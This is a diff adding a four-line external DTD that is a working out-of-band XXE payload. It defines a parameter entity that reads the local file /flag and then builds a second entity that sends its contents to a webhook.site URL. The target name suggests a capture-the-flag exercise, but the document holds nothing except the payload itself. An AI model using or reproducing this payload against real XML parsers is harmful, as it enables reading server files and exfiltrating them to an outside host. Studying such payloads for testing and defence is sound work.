@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///flag">
+<!ENTITY % eval "<!ENTITY &#x25; xxe SYSTEM 'https://webhook.site/5d5b1481-f791-491d-8d6a-f8b4a62c5156/?x=%file;'>">
+%eval;
+%xxe;
